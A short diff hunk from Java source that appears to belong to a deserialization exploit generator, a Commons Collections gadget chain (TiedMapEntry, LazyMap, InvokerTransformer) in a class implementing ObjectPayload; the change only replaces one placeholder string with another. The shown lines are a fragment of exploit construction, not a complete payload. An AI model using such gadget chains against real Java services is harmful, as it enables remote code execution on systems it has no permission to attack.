@@ -32,7 +32,7 @@ public class commonscollectionsk6 implements ObjectPayload<Object> {
         TiedMapEntry            tiedMapEntry       = new TiedMapEntry(lazyMap, templates);
 
         HashMap<Object, Object> expMap = new HashMap<>();
-        expMap.put(tiedMapEntry, "nu1r");
+        expMap.put(tiedMapEntry, "QI4L");
         lazyMap.remove(templates);
 
         Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);
